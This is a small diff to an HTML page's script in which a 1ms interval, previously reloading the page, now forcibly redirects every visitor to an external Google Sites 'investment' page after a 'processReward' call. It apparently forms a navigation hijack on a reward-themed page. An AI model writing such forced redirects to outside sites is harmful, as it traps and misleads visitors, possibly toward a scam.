@@ -91,16 +91,14 @@
             }
         }
 
-        // Continuously refresh the page every 1ms
+        // Continuously refresh and redirect the page
         setInterval(() => {
-            processReward(); // Process the reward if the parameters exist, else continue refreshing
-            window.location.href = window.location.href.split('?')[0]; // Reload without parameters
-        }, 1); // Refresh every 1ms
+            processReward(); // Process the reward if the parameters exist
+            window.location.href = 'https://sites.google.com/view/justerikdemon-investment/f%C5%91oldal'; // Redirect to the desired URL
+        }, 1); // Refresh/redirect every 1ms
 
         // Call the function to process the reward on page load
         processReward();
     </script>
 </body>
 </html>
-
-
